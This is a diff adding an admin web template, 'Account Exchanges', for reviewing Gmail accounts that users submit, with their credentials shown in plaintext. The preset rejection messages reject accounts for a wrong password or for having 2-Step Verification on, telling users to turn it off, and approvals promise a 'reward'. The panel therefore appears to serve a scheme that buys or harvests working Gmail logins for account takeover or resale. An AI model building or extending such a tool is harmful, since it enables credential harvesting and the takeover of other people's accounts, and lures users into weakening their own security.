@@ -1,0 +1,283 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="card glass-panel mb-4 fade-in">
+    <div class="card-body d-flex justify-content-between align-items-center">
+        <div>
+            <h5 class="card-title text-primary mb-1"><i class="fas fa-exchange-alt me-2"></i>Account Exchanges</h5>
+            <p class="text-muted mb-0">Review pending & approved Gmail accounts submitted by users.</p>
+        </div>
+        <button class="btn btn-outline-primary btn-sm" onclick="location.reload()">
+            <i class="fas fa-sync-alt me-1"></i> Refresh
+        </button>
+    </div>
+</div>
+
+<div id="alertBox" class="d-none"></div>
+
+<div class="card glass-panel fade-in delay-1">
+    <div class="card-body p-0">
+        <div class="table-responsive">
+            <table class="table table-hover align-middle mb-0 custom-table" id="exchangesTable">
+                <thead>
+                    <tr>
+                        <th class="ps-4">ID</th>
+                        <th>User ID</th>
+                        <th>Category</th>
+                        <th>Credentials</th>
+                        <th>Status</th>
+                        <th>Admin Message</th>
+                        <th>Submitted At</th>
+                        <th class="text-end pe-4">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="exchangesTbody">
+                    {% for ex in exchanges %}
+                    <tr id="row-exchange-{{ ex.id }}">
+                        <td class="ps-4">#{{ ex.id }}</td>
+                        <td><code>{{ ex.user_id }}</code></td>
+                        <td><span class="badge bg-secondary">{{ ex.category }}</span></td>
+                        <td><code>{{ ex.credentials }}</code></td>
+                        <td id="status-cell-{{ ex.id }}">
+                            {% if ex.status == 'pending' %}
+                            <span class="badge bg-warning text-dark"><i class="fas fa-hourglass-half me-1"></i>Pending</span>
+                            {% elif ex.status == 'approved' %}
+                            <span class="badge bg-success"><i class="fas fa-check-circle me-1"></i>Approved</span>
+                            {% else %}
+                            <span class="badge bg-danger"><i class="fas fa-times-circle me-1"></i>Rejected</span>
+                            {% endif %}
+                        </td>
+                        <td id="msg-cell-{{ ex.id }}">{{ ex.admin_message or '-' }}</td>
+                        <td><small class="text-muted">{{ ex.timestamp|timestamp_to_datetime }}</small></td>
+                        <td class="text-end pe-4" id="actions-cell-{{ ex.id }}">
+                            {% if ex.status == 'pending' %}
+                            <button class="btn btn-sm btn-success me-1" title="Approve" onclick="openActionModal({{ ex.id }}, 'approve')">
+                                <i class="fas fa-check me-1"></i>Approve
+                            </button>
+                            <button class="btn btn-sm btn-danger" title="Reject" onclick="openActionModal({{ ex.id }}, 'reject')">
+                                <i class="fas fa-times me-1"></i>Reject
+                            </button>
+                            {% else %}
+                            <span class="text-muted"><i class="fas fa-check"></i> Processed</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                    {% else %}
+                    <tr id="emptyRow">
+                        <td colspan="8" class="text-center py-4 text-muted">
+                            <i class="fas fa-inbox fa-3x mb-3 text-muted" style="opacity: 0.5;"></i>
+                            <p>No exchanges found.</p>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- Bootstrap 5 Action Modal -->
+<div class="modal fade" id="actionModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content glass-panel" style="border: 1px solid rgba(255,255,255,0.15); background: #1a1d24;">
+            <div class="modal-header border-secondary">
+                <h5 class="modal-title text-light" id="actionModalTitle">Review Exchange</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <input type="hidden" id="modalExchangeId">
+                <input type="hidden" id="modalActionType">
+
+                <div class="mb-3">
+                    <label class="form-label text-muted small">Quick Presets / Templates (Click to fill):</label>
+                    <div id="presetButtons" class="d-flex flex-wrap gap-1 mb-2"></div>
+                </div>
+
+                <div class="mb-3">
+                    <label for="adminMessageInput" class="form-label text-light small" id="adminMessageLabel">Message to User:</label>
+                    <textarea class="form-control" id="adminMessageInput" rows="3" placeholder="Enter message to send to the user..." style="background: rgba(0,0,0,0.3); color: #fff; border-color: rgba(255,255,255,0.2);"></textarea>
+                </div>
+            </div>
+            <div class="modal-footer border-secondary">
+                <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal" id="cancelActionBtn">Cancel</button>
+                <button type="button" class="btn btn-primary btn-sm" id="confirmActionBtn" onclick="submitExchangeAction()">
+                    <span id="btnSpinner" class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+                    <span id="btnText">Confirm Action</span>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+let modalInstance = null;
+
+function getActionModal() {
+    const el = document.getElementById('actionModal');
+    if (!el) return null;
+    if (typeof bootstrap !== 'undefined' && bootstrap.Modal) {
+        modalInstance = bootstrap.Modal.getInstance(el) || new bootstrap.Modal(el);
+    }
+    return modalInstance;
+}
+
+function openActionModal(id, action) {
+    document.getElementById('modalExchangeId').value = id;
+    document.getElementById('modalActionType').value = action;
+    
+    const title = document.getElementById('actionModalTitle');
+    const label = document.getElementById('adminMessageLabel');
+    const confirmBtn = document.getElementById('confirmActionBtn');
+    const msgInput = document.getElementById('adminMessageInput');
+    const presetContainer = document.getElementById('presetButtons');
+    
+    presetContainer.innerHTML = '';
+    
+    if (action === 'approve') {
+        title.innerHTML = `<i class="fas fa-check-circle text-success me-2"></i>Approve Exchange #${id}`;
+        label.innerText = 'Message to User on Approval:';
+        confirmBtn.className = 'btn btn-success btn-sm';
+        document.getElementById('btnText').innerText = 'Approve & Send';
+        msgInput.value = 'Approved! Account details / reward dispatched.';
+        
+        const approvePresets = [
+            'Approved! Enjoy your reward 🎉',
+            'Verified & Approved successfully ✅',
+            'DM @admin for your reward details'
+        ];
+        approvePresets.forEach(preset => {
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            btn.className = 'btn btn-outline-success btn-sm py-0 px-2';
+            btn.innerText = preset;
+            btn.onclick = () => { msgInput.value = preset; };
+            presetContainer.appendChild(btn);
+        });
+    } else {
+        title.innerHTML = `<i class="fas fa-times-circle text-danger me-2"></i>Reject Exchange #${id}`;
+        label.innerText = 'Reason for Rejection:';
+        confirmBtn.className = 'btn btn-danger btn-sm';
+        document.getElementById('btnText').innerText = 'Reject & Notify';
+        msgInput.value = 'Invalid password. Please check your credentials and retry.';
+        
+        const rejectPresets = [
+            'Invalid Password',
+            '2FA / 2-Step Verification is ON (Please turn it OFF)',
+            'Only Gmail accounts are allowed',
+            'Account is suspended / disabled'
+        ];
+        rejectPresets.forEach(preset => {
+            const btn = document.createElement('button');
+            btn.type = 'button';
+            btn.className = 'btn btn-outline-danger btn-sm py-0 px-2';
+            btn.innerText = preset;
+            btn.onclick = () => { msgInput.value = preset; };
+            presetContainer.appendChild(btn);
+        });
+    }
+    
+    const m = getActionModal();
+    if (m) {
+        m.show();
+    }
+}
+
+async function submitExchangeAction() {
+    const id = document.getElementById('modalExchangeId').value;
+    const action = document.getElementById('modalActionType').value;
+    const msg = document.getElementById('adminMessageInput').value.trim();
+    
+    const confirmBtn = document.getElementById('confirmActionBtn');
+    const cancelBtn = document.getElementById('cancelActionBtn');
+    const spinner = document.getElementById('btnSpinner');
+    const btnText = document.getElementById('btnText');
+    
+    confirmBtn.disabled = true;
+    if (cancelBtn) cancelBtn.disabled = true;
+    spinner.classList.remove('d-none');
+    btnText.innerText = 'Processing...';
+    
+    try {
+        const response = await fetch('/exchanges/action', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id: parseInt(id), action: action, message: msg })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            const m = getActionModal();
+            if (m) m.hide();
+            
+            const row = document.getElementById(`row-exchange-${id}`);
+            if (row) {
+                if (action === 'reject') {
+                    // Smoothly fade out and remove rejected row without reload
+                    row.style.transition = 'all 0.3s ease';
+                    row.style.opacity = '0';
+                    row.style.transform = 'scale(0.95)';
+                    setTimeout(() => {
+                        row.remove();
+                        // If no more rows, show empty placeholder
+                        const tbody = document.getElementById('exchangesTbody');
+                        if (tbody && tbody.querySelectorAll('tr').length === 0) {
+                            tbody.innerHTML = `
+                                <tr id="emptyRow">
+                                    <td colspan="8" class="text-center py-4 text-muted">
+                                        <i class="fas fa-inbox fa-3x mb-3 text-muted" style="opacity: 0.5;"></i>
+                                        <p>No exchanges found.</p>
+                                    </td>
+                                </tr>
+                            `;
+                        }
+                    }, 300);
+                    showAlert(`✅ Exchange #${id} rejected and removed.`, 'success');
+                } else if (action === 'approve') {
+                    // Update status badge & action buttons smoothly
+                    const statusCell = document.getElementById(`status-cell-${id}`);
+                    const actionsCell = document.getElementById(`actions-cell-${id}`);
+                    const msgCell = document.getElementById(`msg-cell-${id}`);
+                    
+                    if (statusCell) {
+                        statusCell.innerHTML = '<span class="badge bg-success"><i class="fas fa-check-circle me-1"></i>Approved</span>';
+                    }
+                    if (msgCell) {
+                        msgCell.innerText = msg || '-';
+                    }
+                    if (actionsCell) {
+                        actionsCell.innerHTML = '<span class="text-muted"><i class="fas fa-check"></i> Processed</span>';
+                    }
+                    showAlert(`✅ Exchange #${id} approved successfully!`, 'success');
+                }
+            }
+        } else {
+            alert('Action failed: ' + (data.error || 'Unknown error'));
+        }
+    } catch (error) {
+        console.error('Exchange action error:', error);
+        alert('An error occurred: ' + error.message);
+    } finally {
+        confirmBtn.disabled = false;
+        if (cancelBtn) cancelBtn.disabled = false;
+        spinner.classList.add('d-none');
+        btnText.innerText = action === 'approve' ? 'Approve & Send' : 'Reject & Notify';
+    }
+}
+
+function showAlert(message, type) {
+    const alertBox = document.getElementById('alertBox');
+    if (!alertBox) return;
+    alertBox.className = `alert alert-${type} alert-dismissible fade show`;
+    alertBox.innerHTML = `
+        ${message}
+        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+    `;
+    setTimeout(() => {
+        alertBox.className = 'd-none';
+    }, 4000);
+}
+</script>
+{% endblock %}
